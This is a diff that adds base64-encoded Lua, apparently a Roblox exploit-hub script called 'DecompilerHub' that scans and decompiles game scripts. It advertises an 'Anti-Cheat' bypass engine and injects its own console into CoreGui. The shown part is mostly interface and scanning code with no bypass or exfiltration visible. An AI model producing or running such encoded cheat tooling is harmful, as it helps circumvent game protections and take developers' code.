+'Z2Z1bmMoIlJlc29sdmluZyByZXF1aXJlIHBhdGhzLi4uIiwgImluZm8iKSBlbHNlaWYgX19wcm9nIHRoZW4gX19wcm9nKCJSZXNvbHZpbmcgcmVxdWlyZSBw',
+'YXRocy4uLiIsICJpbmZvIikgZW5kCiAgICBpZiB1cGZ1bmMgdGhlbiB1cGZ1bmMoMCwgMCwgMCwgMCwgInBvc3QiKSBlbHNlaWYgdXBkYXRlUHJvZ3Jlc3Mg',
+'dGhlbiB1cGRhdGVQcm9ncmVzcygwLCAwLCAwLCAwLCAicG9zdCIpIGVuZAogICAgZG8KICAgICAgICBsb2NhbCBtb2R1bGVCeVBhdGggPSB7fQogICAgICAg',
+'IGZvciBfLCB2IGluIGlwYWlycyhyLnNjcmlwdHMpIGRvCiAgICAgICAgICAgIGlmIHYudCA9PSAiTW9kdWxlU2NyaXB0IiB0aGVuIG1vZHVsZUJ5UGF0aFt2',
+'LnBhdGhdID0gdiBlbmQKICAgICAgICBlbmQKICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoci5zY3JpcHRzKSBkbwogICAgICAgICAgICBsb2NhbCByZXNv',
+'bHZlZCA9IHt9CiAgICAgICAgICAgIGZvciByYXdQYXRoIGluIHBhaXJzKHYucmVxdWlyZXMgb3Ige30pIGRvCiAgICAgICAgICAgICAgICBsb2NhbCByZXNv',
+'bHZlZFBhdGggPSByYXdQYXRoCiAgICAgICAgICAgICAgICBsb2NhbCBvaywgdHJhbnNmb3JtZWQgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAg',
+'ICAgICAgbG9jYWwgcCA9IHJhd1BhdGgKICAgICAgICAgICAgICAgICAgICBwID0gcDpnc3ViKCJec2NyaXB0JS5QYXJlbnQlLiIsICIiKTpnc3ViKCJec2Ny',
+'aXB0JS4iLCAiIik6Z3N1YigiJS4iLCAiOiIpCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgYmFzZSA9IHYucGF0aDptYXRjaCgiXiguKyklLlteJS5dKyQi',
+'KSBvciB2LnBhdGgKICAgICAgICAgICAgICAgICAgICBsb2NhbCBhdHRlbXB0ID0gYmFzZSAuLiAiOiIgLi4gcAogICAgICAgICAgICAgICAgICAgIGlmIG1v',
+'ZHVsZUJ5UGF0aFthdHRlbXB0XSB0aGVuIHJldHVybiBhdHRlbXB0IGVuZAogICAgICAgICAgICAgICAgICAgIGlmIG1vZHVsZUJ5UGF0aFtyYXdQYXRoXSB0',
+'aGVuIHJldHVybiByYXdQYXRoIGVuZAogICAgICAgICAgICAgICAgICAgIHJldHVybiByYXdQYXRoCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAg',
+'ICAgICBpZiBvayBhbmQgdHJhbnNmb3JtZWQgdGhlbiByZXNvbHZlZFBhdGggPSB0cmFuc2Zvcm1lZCBlbmQKICAgICAgICAgICAgICAgIHJlc29sdmVkW3Jl',
+'c29sdmVkUGF0aF0gPSB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB2LnJlcXVpcmVzID0gcmVzb2x2ZWQKICAgICAgICBlbmQKICAgIGVuZAoK',
+'ICAgIGlmIHByb2dmdW5jIHRoZW4gcHJvZ2Z1bmMoIkJ1aWxkaW5nIG1vZHVsZSBkZXBlbmRlbmN5IHRyZWUuLi4iLCAiaW5mbyIpIGVsc2VpZiBfX3Byb2cg',
+'dGhlbiBfX3Byb2coIkJ1aWxkaW5nIG1vZHVsZSBkZXBlbmRlbmN5IHRyZWUuLi4iLCAiaW5mbyIpIGVuZAogICAgZG8KICAgICAgICBsb2NhbCBtb2RSZWZz',
+'ID0ge30KICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoci5zY3JpcHRzKSBkbwogICAgICAgICAgICBmb3IgcGF0aCBpbiBwYWlycyh2LnJlcXVpcmVzIG9y',
+'IHt9KSBkbwogICAgICAgICAgICAgICAgaWYgbm90IG1vZFJlZnNbcGF0aF0gdGhlbiBtb2RSZWZzW3BhdGhdID0ge30gZW5kCiAgICAgICAgICAgICAgICBt',
+'b2RSZWZzW3BhdGhdWyNtb2RSZWZzW3BhdGhdKzFdID0gdi5wYXRoCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHIubW9kdWxlUmVmcyA9',
+'IG1vZFJlZnMKICAgICAgICByLm1vZHVsZUNvdW50ID0gMAogICAgICAgIGZvciBfIGluIHBhaXJzKG1vZFJlZnMpIGRvIHIubW9kdWxlQ291bnQgPSByLm1v',
+'ZHVsZUNvdW50ICsgMSBlbmQKICAgIGVuZAoKICAgIGlmIHByb2dmdW5jIHRoZW4gcHJvZ2Z1bmMoIkJ1aWxkaW5nIGNyb3NzLXJlZmVyZW5jZS4uLiIsICJp',
+'bmZvIikgZWxzZWlmIF9fcHJvZyB0aGVuIF9fcHJvZygiQnVpbGRpbmcgY3Jvc3MtcmVmZXJlbmNlLi4uIiwgImluZm8iKSBlbmQKICAgIGJ1aWxkQ3Jvc3NS',
+'ZWZlcmVuY2Uoci5zY3JpcHRzKQoKICAgIGlmIHByb2dmdW5jIHRoZW4KICAgICAgICBwcm9nZnVuYyhzdHJpbmcuZm9ybWF0KCJTY2FuIGNvbXBsZXRlISAl',
+'ZCBpbnN0YW5jZXMsICVkIHNjcmlwdHMiLCByLnRvdGFsLCAjci5zY3JpcHRzKSwgImRvbmUiKQogICAgZWxzZWlmIF9fcHJvZyB0aGVuCiAgICAgICAgX19w',
+'cm9nKHN0cmluZy5mb3JtYXQoIlNjYW4gY29tcGxldGUhICVkIGluc3RhbmNlcywgJWQgc2NyaXB0cyIsIHIudG90YWwsICNyLnNjcmlwdHMpLCAiZG9uZSIp',
+'CiAgICBlbmQKICAgIGlmIHVwZnVuYyB0aGVuIHVwZnVuYyhyLnRvdGFsLCAjci5zY3JpcHRzLCAwLCAwLCAiZG9uZSIpIGVsc2VpZiB1cGRhdGVQcm9ncmVz',
+'cyB0aGVuIHVwZGF0ZVByb2dyZXNzKHIudG90YWwsICNyLnNjcmlwdHMsIDAsIDAsICJkb25lIikgZW5kCiAgICByZXR1cm4gYnVpbGRSZXBvcnQocikKZW5k',
+'CgotLSBIaWRlL3Nob3cgR1VJIHdpdGggQmFja3NwYWNlLCBjb3B5IGNvbnNvbGUgd2l0aCDDg+KAoQpsb2NhbCBVc2VySW5wdXRTZXJ2aWNlID0gZ2FtZTpH',
+'ZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikKbG9jYWwgZ3VpSGlkZGVuID0gZmFsc2UKVXNlcklucHV0U2VydmljZS5JbnB1dEJlZ2FuOkNvbm5lY3Qo',
+'ZnVuY3Rpb24oaW5wdXQsIGdwKQogICAgaWYgZ3AgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5CYWNrc3Bh',
+'Y2UgdGhlbgogICAgICAgIGd1aUhpZGRlbiA9IG5vdCBndWlIaWRkZW4KICAgICAgICBpZiBndWlIaWRkZW4gdGhlbgogICAgICAgICAgICBpZiBjb25HdWkg',
+'dGhlbiBjb25HdWkuRW5hYmxlZCA9IGZhbHNlIGVuZAogICAgICAgICAgICBpZiBhZGRQcm9nIHRoZW4gYWRkUHJvZygiR1VJIGhpZGRlbiAoQmFja3NwYWNl',
+'IHRvIHNob3cpIiwgIndhcm4iKSBlbmQKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIGNvbkd1aSB0aGVuIGNvbkd1aS5FbmFibGVkID0gdHJ1ZSBlbmQK',
+'ICAgICAgICAgICAgaWYgYWRkUHJvZyB0aGVuIGFkZFByb2coIkdVSSBzaG93biIsICJpbmZvIikgZW5kCiAgICAgICAgZW5kCiAgICBlbHNlaWYgaW5wdXQu',
+'S2V5Q29kZSA9PSBFbnVtLktleUNvZGUuTGVmdEJyYWNrZXQgdGhlbgogICAgICAgIGxvY2FsIHR4dCA9IHRhYmxlLmNvbmNhdChwcm9nTGluZXMsICJcbiIp',
+'CiAgICAgICAgaWYgX3NldGNsaXBib2FyZCBhbmQgI3R4dCA+IDAgdGhlbgogICAgICAgICAgICBwY2FsbChfc2V0Y2xpcGJvYXJkLCB0eHQpCiAgICAgICAg',
+'ICAgIGlmIGFkZFByb2cgdGhlbiBhZGRQcm9nKCJDb25zb2xlIGxvZ3MgY29waWVkIHRvIGNsaXBib2FyZCEiLCAiZG9uZSIpIGVuZAogICAgICAgIGVuZAog',
+'ICAgZW5kCmVuZCkKCmxvY2FsIFdpbmRvdyA9IFJheWZpZWxkOkNyZWF0ZVdpbmRvdyh7CiAgICBOYW1lID0gIkRlY29tcGlsZXJIdWIgdjQuMCAoRklYRUQp',
+'IiwKICAgIExvYWRpbmdUaXRsZSA9ICJHYW1lIFNjYW5uZXIgKyBCeXBhc3MgRW5naW5lIiwKICAgIExvYWRpbmdTdWJ0aXRsZSA9ICJDcm9zcy1SZWZlcmVu',
+'Y2UgKyBBbnRpLUNoZWF0ICsgT2JmdXNjYXRpb24gU2Nhbm5lciIsCiAgICBUaGVtZSA9ICJEZWZhdWx0IiwKICAgIENvbmZpZ3VyYXRpb25TYXZpbmcgPSB7',
+'IEVuYWJsZWQgPSBmYWxzZSB9LAogICAgS2V5U3lzdGVtID0gZmFsc2UsCn0pCgpsb2NhbCBNYWluVGFiID0gV2luZG93OkNyZWF0ZVRhYigiTWFpbiIsIDAp',
+'CmxvY2FsIFNldHRpbmdzVGFiID0gV2luZG93OkNyZWF0ZVRhYigiU2V0dGluZ3MiLCAwKQoKbG9jYWwgc2tpcFNtYWxsU2NyaXB0cyA9IHRydWUKCmxvY2Fs',
+'IHByb2dMaW5lcyA9IHt9CmxvY2FsIGxvZ0JveCwgbG9nVHh0LCBjb25GcmFtZSwgY29uR3VpCmxvY2FsIGF1dG9TY3JvbGwgPSB0cnVlCgpsb2NhbCBmdW5j',
+'dGlvbiBkZXN0cm95Q29uc29sZSgpCiAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgaWYgY29uR3VpIHRoZW4KICAgICAgICAgICAgY29uR3VpOkRlc3Ry',
+'b3koKQogICAgICAgICAgICBjb25HdWkgPSBuaWw7IGxvZ0JveCA9IG5pbDsgbG9nVHh0ID0gbmlsOyBjb25GcmFtZSA9IG5pbAogICAgICAgICAgICBwcm9n',
+'QmFyID0gbmlsOyBwcm9nVHh0ID0gbmlsOyBwcm9nRmlsbCA9IG5pbAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIHByb2dCYXIsIHByb2dUeHQs',
+'IHByb2dGaWxsCgpsb2NhbCBmdW5jdGlvbiBjcmVhdGVDb25zb2xlKCkKICAgIGRlc3Ryb3lDb25zb2xlKCkKICAgIGNvbkd1aSA9IEluc3RhbmNlLm5ldygi',
+'U2NyZWVuR3VpIik7IGNvbkd1aS5OYW1lID0gIkRIQ29uc29sZSI7IGNvbkd1aS5FbmFibGVkID0gdHJ1ZQoKICAgIGNvbkZyYW1lID0gSW5zdGFuY2UubmV3',
+'KCJGcmFtZSIpCiAgICBjb25GcmFtZS5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDIyMikKICAgIGNvbkZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAs',
+'IDAsIDEsIC0yMjIpCiAgICBjb25GcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoOCwgOCwgMTYpCiAgICBjb25GcmFtZS5Cb3JkZXJT',
+'aXplUGl4ZWwgPSAwCiAgICBjb25GcmFtZS5QYXJlbnQgPSBjb25HdWkKCiAgICBsb2dCb3ggPSBJbnN0YW5jZS5uZXcoIlNjcm9sbGluZ0ZyYW1lIikKICAg',
+'IGxvZ0JveC5TaXplID0gVURpbTIubmV3KDEsIC02LCAxLCAtMjgpCiAgICBsb2dCb3guUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMywgMCwgMykKICAgIGxv',
+'Z0JveC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoOCwgOCwgMTYpCiAgICBsb2dCb3guQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgbG9nQm94',
+'LlNjcm9sbEJhclRoaWNrbmVzcyA9IDYKICAgIGxvZ0JveC5DYW52YXNTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBsb2dCb3guUGFyZW50ID0g',
+'Y29uRnJhbWUKICAgIGxvZ0JveDpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIkNhbnZhc1Bvc2l0aW9uIik6Q29ubmVjdChmdW5jdGlvbigpCiAgICAgICAg',
+'aWYgbG9nQm94IHRoZW4KICAgICAgICAgICAgbG9jYWwgYm90dG9tID0gbG9nQm94LkNhbnZhc1Bvc2l0aW9uLlkgKyBsb2dCb3guQWJzb2x1dGVXaW5kb3dT',
+'aXplLlkKICAgICAgICAgICAgbG9jYWwgbWF4U2Nyb2xsID0gbG9nQm94LkNhbnZhc1NpemUuWS5PZmZzZXQKICAgICAgICAgICAgYXV0b1Njcm9sbCA9IGJv',
+'dHRvbSA+PSBtYXhTY3JvbGwgLSA1CiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgbG9nVHh0ID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgbG9n',
+'VHh0LlNpemUgPSBVRGltMi5uZXcoMSwgLTEwLCAxLCAtNikKICAgIGxvZ1R4dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA1LCAwLCAzKQogICAgbG9nVHh0',
+'LlRleHQgPSAiIgogICAgbG9nVHh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxNTAsIDIzMCwgMTUwKQogICAgbG9nVHh0LkZvbnQgPSBFbnVtLkZv',
+'bnQuQ29kZQogICAgbG9nVHh0LlRleHRTaXplID0gMTIKICAgIGxvZ1R4dC5SaWNoVGV4dCA9IHRydWUKICAgIGxvZ1R4dC5UZXh0WEFsaWdubWVudCA9IEVu',
+'dW0uVGV4dFhBbGlnbm1lbnQuTGVmdAogICAgbG9nVHh0LlRleHRZQWxpZ25tZW50ID0gRW51bS5UZXh0WUFsaWdubWVudC5Ub3AKICAgIGxvZ1R4dC5CYWNr',
+'Z3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgbG9nVHh0LlBhcmVudCA9IGxvZ0JveAoKICAgIHByb2dCYXIgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAg',
+'IHByb2dCYXIuU2l6ZSA9IFVEaW0yLm5ldygxLCAtNiwgMCwgMjApCiAgICBwcm9nQmFyLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDMsIDEsIC0yNCkKICAg',
+'IHByb2dCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwLCAyMCwgMzApCiAgICBwcm9nQmFyLkJvcmRlclNpemVQaXhlbCA9IDEKICAg',
+'IHByb2dCYXIuQm9yZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA4MCkKICAgIHByb2dCYXIuUGFyZW50ID0gY29uRnJhbWUKCiAgICBwcm9n',
+'RmlsbCA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgcHJvZ0ZpbGwuU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAxLCAwKQogICAgcHJvZ0ZpbGwuQmFja2dy',
+'b3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCAyMDAsIDgwKQogICAgcHJvZ0ZpbGwuQm9yZGVyU2l6ZVBpeGVsID0gMAogICAgcHJvZ0ZpbGwuUGFy',
+'ZW50ID0gcHJvZ0JhcgoKICAgIHByb2dUeHQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBwcm9nVHh0LlNpemUgPSBVRGltMi5uZXcoMSwgMCwg',
+'MSwgMCkKICAgIHByb2dUeHQuVGV4dCA9ICIiCiAgICBwcm9nVHh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMDAsIDI1NSwgMjAwKQogICAgcHJv',
+'Z1R4dC5Gb250ID0gRW51bS5Gb250LkNvZGUKICAgIHByb2dUeHQuVGV4dFNpemUgPSAxNAogICAgcHJvZ1R4dC5SaWNoVGV4dCA9IHRydWUKICAgIHByb2dU',
+'eHQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIHByb2dUeHQuVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkNlbnRlcgogICAg',
+'cHJvZ1R4dC5QYXJlbnQgPSBwcm9nQmFyCgogICAgcGNhbGwoZnVuY3Rpb24oKSBjb25HdWkuUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJDb3JlR3VpIikg',
+'ZW5kKQogICAgcHJvZ1R4dC5UZXh0ID0gIjxmb250IGNvbG9yPScjNTBDOEZGJyBzaXplPScxOCc+MCU8L2ZvbnQ+IgplbmQKCmxvY2FsIGZ1bmN0aW9uIHVw',
+'ZGF0ZVByb2dyZXNzKGluc3RDb3VudCwgc2NDb3VudCwgcmF0ZSwgZWxhcHNlZCwgcGhhc2UpCiAgICBpZiBub3QgcHJvZ1R4dCBvciBub3QgcHJvZ0ZpbGwg',
+'dGhlbiByZXR1cm4gZW5kCiAgICBsb2NhbCBwY3QgPSAwCiAgICBpZiBwaGFzZSA9PSAic2NhbiIgdGhlbgogICAgICAgIHBjdCA9IG1hdGgubWluKDk1LCBt',
+'YXRoLmZsb29yKChpbnN0Q291bnQgLyBtYXRoLm1heChpbnN0Q291bnQgKyA1MDAsIDEpKSAqIDk1KSkKICAgICAgICBsb2NhbCBjb2xvciA9IHBjdCA8IDQw',
+'IGFuZCAiIzUwQzhGRiIgb3IgKHBjdCA8IDcwIGFuZCAiI0ZGRDcwMCIgb3IgIiM1MEZGNTAiKQogICAgICAgIHByb2dUeHQuVGV4dCA9IHN0cmluZy5mb3Jt',
+'YXQoIjxmb250IGNvbG9yPSclcycgc2l6ZT0nMTgnPiVkJSU8L2ZvbnQ+IiwgY29sb3IsIHBjdCkKICAgIGVsc2VpZiBwaGFzZSA9PSAiZGVjb21waWxlIiB0',
+'aGVuCiAgICAgICAgcGN0ID0gbWF0aC5mbG9vcigoaW5zdENvdW50IC8gbWF0aC5tYXgoc2NDb3VudCwgMSkpICogODUpICsgMTAKICAgICAgICBwcm9nVHh0',
+'LlRleHQgPSBzdHJpbmcuZm9ybWF0KCI8Zm9udCBjb2xvcj0nI0ZGRDcwMCcgc2l6ZT0nMTQnPkRlY29tcGlsZSAlZC8lZDwvZm9udD4iLCBpbnN0Q291bnQs',
+'IHNjQ291bnQpCiAgICBlbHNlaWYgcGhhc2UgPT0gInBvc3QiIHRoZW4KICAgICAgICBwcm9nVHh0LlRleHQgPSAiPGZvbnQgY29sb3I9JyNGRkQ3MDAnIHNp',
+'emU9JzE0Jz5Qcm9jZXNzaW5nLi4uPC9mb250PiIKICAgIGVsc2VpZiBwaGFzZSA9PSAiZG9uZSIgdGhlbgogICAgICAgIHByb2dUeHQuVGV4dCA9ICI8Zm9u',
+'dCBjb2xvcj0nIzUwRkY1MCcgc2l6ZT0nMTgnPjEwMCU8L2ZvbnQ+IgogICAgICAgIHBjdCA9IDEwMAogICAgZWxzZWlmIHBoYXNlID09ICJlcnJvciIgdGhl',
+'bgogICAgICAgIHByb2dUeHQuVGV4dCA9ICI8Zm9udCBjb2xvcj0nI0ZGNTA1MCcgc2l6ZT0nMTQnPkVSUk9SPC9mb250PiIKICAgIGVsc2VpZiBwaGFzZSA9',
+'PSAiYWJvcnRlZCIgdGhlbgogICAgICAgIHByb2dUeHQuVGV4dCA9ICI8Zm9udCBjb2xvcj0nI0ZGQTUwMCcgc2l6ZT0nMTQnPkFCT1JURUQ8L2ZvbnQ+Igog',
+'ICAgZWxzZQogICAgICAgIHByb2dUeHQuVGV4dCA9ICIiCiAgICAgICAgcGN0ID0gMAogICAgZW5kCiAgICBwcm9nRmlsbC5TaXplID0gVURpbTIubmV3KHBj',
+'dCAvIDEwMCwgMCwgMSwgMCkKZW5kCgpsb2NhbCBmdW5jdGlvbiB1cGRhdGVDb24oKQogICAgbG9jYWwgdHh0ID0gdGFibGUuY29uY2F0KHByb2dMaW5lcywg',
+'IlxuIikKICAgIHBjYWxsKGZ1bmN0aW9uKCkgaWYgbG9nVHh0IHRoZW4gbG9nVHh0LlRleHQgPSB0eHQgZW5kIGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkK',
+'ICAgICAgICBpZiBsb2dCb3ggYW5kIGxvZ1R4dCB0aGVuCiAgICAgICAgICAgIGxvZ1R4dC5TaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgOTk5OTkpCiAg',
+'ICAgICAgICAgIGxvY2FsIGggPSBsb2dUeHQuVGV4dEJvdW5kcy5ZICsgNAogICAgICAgICAgICBsb2dUeHQuU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAs',
+'IGgpCiAgICAgICAgICAgIGxvZ0JveC5DYW52YXNTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIGgpCiAgICAgICAgICAgIGlmIGF1dG9TY3JvbGwgdGhlbgog',
+'ICAgICAgICAgICAgICAgbG9nQm94LkNhbnZhc1Bvc2l0aW9uID0gVmVjdG9yMi5uZXcoMCwgbWF0aC5tYXgoMCwgaCAtIGxvZ0JveC5BYnNvbHV0ZVdpbmRv',
+'d1NpemUuWSkpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kKQplbmQKCmxvY2FsIGxhc3RNc2dUeXBlID0gImluZm8iCmxvY2FsIGZ1bmN0',
+'aW9uIGFkZFByb2cobXNnLCBtc2dUeXBlKQogICAgbXNnVHlwZSA9IG1zZ1R5cGUgb3IgImluZm8iCiAgICBsb2NhbCBjb2xvcgogICAgaWYgbXNnVHlwZSA9',
+'PSAiaW5mbyIgdGhlbiBjb2xvciA9ICIjOTZFNjk2IgogICAgZWxzZWlmIG1zZ1R5cGUgPT0gIndhcm4iIHRoZW4gY29sb3IgPSAiI0ZGRDcwMCIKICAgIGVs',
+'c2VpZiBtc2dUeXBlID09ICJlcnJvciIgdGhlbiBjb2xvciA9ICIjRkY1MDUwIgogICAgZWxzZWlmIG1zZ1R5cGUgPT0gImRvbmUiIHRoZW4gY29sb3IgPSAi',
+'IzUwRkY1MCIKICAgIGVsc2VpZiBtc2dUeXBlID09ICJzY2FuIiB0aGVuIGNvbG9yID0gIiM1MEM4RkYiCiAgICBlbHNlaWYgbXNnVHlwZSA9PSAic2NyaXB0',
+'IiB0aGVuIGNvbG9yID0gIiNDOEEwRkYiCiAgICBlbHNlIGNvbG9yID0gIiM5NkU2OTYiIGVuZAogICAgbG9jYWwgdHMgPSBvcy5kYXRlKCIlSDolTTolUyIp',
+'CiAgICBwcm9nTGluZXNbI3Byb2dMaW5lcysxXSA9IHN0cmluZy5mb3JtYXQoIjxmb250IGNvbG9yPScjODA4MDgwJz5bJXNdPC9mb250PiA8Zm9udCBjb2xv',
+'cj0nJXMnPiVzPC9mb250PiIsIHRzLCBjb2xvciwgbXNnKQogICAgaWYgI3Byb2dMaW5lcyA+IDIwMCB0aGVuIHRhYmxlLnJlbW92ZShwcm9nTGluZXMsIDEp',
+'IGVuZAogICAgdXBkYXRlQ29uKCkKZW5kCgpfX3Byb2cgPSBhZGRQcm9nCl9fdXBkbG9nID0gdXBkYXRlQ29uCnVwZGF0ZVByb2dyZXNzID0gdXBkYXRlUHJv',
+'Z3Jlc3MKc2NhblNwZWVkID0gNQpsb3dEZXZpY2VNb2RlID0gZmFsc2UKCmxvY2FsIHNjYW5CdXN5ID0gZmFsc2UKCk1haW5UYWI6Q3JlYXRlSW5wdXQoeyBO',
+'YW1lID0gIlNjYW4gU3BlZWQgKDEtMTApIiwgUGxhY2Vob2xkZXJUZXh0ID0gIjUiLCBOdW1lcmljID0gdHJ1ZSwgUmVtb3ZlVGV4dEFmdGVyRm9jdXNMb3N0',
+'ID0gZmFsc2UsIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgIGxvY2FsIG4gPSB0b251bWJlcih2KQogICAgaWYgbiBhbmQgbiA+PSAxIGFuZCBuIDw9IDEw',
+'IHRoZW4KICAgICAgICBzY2FuU3BlZWQgPSBtYXRoLmZsb29yKG4pCiAgICAgICAgYWRkUHJvZygiU3BlZWQgc2V0IHRvICIgLi4gc2NhblNwZWVkKQogICAg',
+'ZWxzZWlmICN2ID4gMCB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBSYXlmaWVsZDpOb3RpZnkoeyBUaXRsZSA9ICJFcnJvciIsIENvbnRlbnQgPSAi',
+'U3BlZWQgbXVzdCBiZSAxLTEwIiwgRHVyYXRpb24gPSAzIH0pIGVuZCkKICAgIGVuZAplbmQgfSkKCk1haW5UYWI6Q3JlYXRlVG9nZ2xlKHsgTmFtZSA9ICJM',
+'b3cgRGV2aWNlIE1vZGUiLCBDdXJyZW50VmFsdWUgPSBmYWxzZSwgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgbG93RGV2aWNlTW9kZSA9IHYKICAgIGlm',
+'IHYgdGhlbiBhZGRQcm9nKCJMb3cgRGV2aWNlIE1vZGUgT04gLSBleHRyYSBzdGFiaWxpdHkgZm9yIG1vYmlsZS93ZWFrIGRldmljZXMiLCAiaW5mbyIpCiAg',
+'ICBlbHNlIGFkZFByb2coIkxvdyBEZXZpY2UgTW9kZSBPRkYgLSBmdWxsIHNwZWVkIiwgImluZm8iKSBlbmQKZW5kIH0pCgpNYWluVGFiOkNyZWF0ZVRvZ2ds',
+'ZSh7IE5hbWUgPSAiU2tpcCBTbWFsbCBTY3JpcHRzIiwgQ3VycmVudFZhbHVlID0gdHJ1ZSwgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgc2tpcFNtYWxs',
+'U2NyaXB0cyA9IHYKICAgIGlmIHYgdGhlbiBhZGRQcm9nKCJTbWFsbCBzY3JpcHRzICg8MjAwIGNoYXJzKSB3aWxsIHNraXAgZGVlcCBhbmFseXNpcyIsICJp',
+'bmZvIikKICAgIGVsc2UgYWRkUHJvZygiQWxsIHNjcmlwdHMgd2lsbCBiZSBmdWxseSBhbmFseXplZCIsICJpbmZvIikgZW5kCmVuZCB9KQoKbG9jYWwgZnVu',
+'Y3Rpb24gYXBwbHlQb3RhdG9Nb2RlKCkKICAgIGlmIG5vdCBsb3dEZXZpY2VNb2RlIHRoZW4gcmV0dXJuIGVuZAogICAgYWRkUHJvZygiW1BvdGF0b10gT3B0',
+'aW1pemluZyBncmFwaGljcy4uLiIsICJpbmZvIikKICAgIHBjYWxsKGZ1bmN0aW9uKCkgZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIikuTW91',
+'c2VCZWhhdmlvciA9IEVudW0uTW91c2VCZWhhdmlvci5EZWZhdWx0IGVuZCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEu',
+'RmllbGRPZlZpZXcgPSA3MCBlbmQpCiAgICBsb2NhbCByZW1vdmVkID0gMAogICAgZm9yIF8sIHYgaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50',
+'cygpKSBkbwogICAgICAgIGxvY2FsIGMgPSB2LkNsYXNzTmFtZQogICAgICAgIGlmIGMgPT0gIkRlY2FsIiBvciBjID09ICJUZXh0dXJlIiBvciBjID09ICJT',
+'cGVjaWFsTWVzaCIgb3IgYyA9PSAiUGFydGljbGVFbWl0dGVyIiBvciBjID09ICJUcmFpbCIgb3IgYyA9PSAiQmVhbSIgb3IgYyA9PSAiU21va2UiIG9yIGMg',
+'PT0gIkZpcmUiIG9yIGMgPT0gIlNwYXJrbGVzIiB0aGVuCiAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgdjpEZXN0cm95KCkgZW5kKQogICAgICAgICAg',
+'ICByZW1vdmVkID0gcmVtb3ZlZCArIDEKICAgICAgICBlbmQKICAgIGVuZAogICAgYWRkUHJvZygiW1BvdGF0b10gUmVtb3ZlZCAiIC4uIHJlbW92ZWQgLi4g',
+'IiB2aXN1YWwgZWxlbWVudHMiLCAiZG9uZSIpCiAgICBwY2FsbChmdW5jdGlvbigpIGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpOlNldDNkUmVuZGVy',
+'aW5nRW5hYmxlZChmYWxzZSkgZW5kKQogICAgdGFzay53YWl0KDAuNSkKICAgIHBjYWxsKGZ1bmN0aW9uKCkgZ2FtZTpHZXRTZXJ2aWNlKCJSdW5TZXJ2aWNl',
+'Iik6U2V0M2RSZW5kZXJpbmdFbmFibGVkKHRydWUpIGVuZCkKICAgIGFkZFByb2coIltQb3RhdG9dIEdyYXBoaWNzIG9wdGltaXplZCBmb3IgbG93IGRldmlj',
+'ZSIsICJkb25lIikKZW5kCgpNYWluVGFiOkNyZWF0ZUJ1dHRvbih7IE5hbWUgPSAiU3RhcnQgU2NhbiIsIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgaWYg',
+'c2NhbkJ1c3kgdGhlbiByZXR1cm4gZW5kCiAgICBzY2FuQnVzeSA9IHRydWUKICAgIHNjYW5BYm9ydGVkID0gZmFsc2UKICAgIHByb2dMaW5lcyA9IHt9CiAg',
+'ICBjcmVhdGVDb25zb2xlKCkKICAgIGlmIGxvd0RldmljZU1vZGUgdGhlbiBhcHBseVBvdGF0b01vZGUoKSBlbmQKICAgIGFkZFByb2coIlNjYW5uaW5nLi4u',
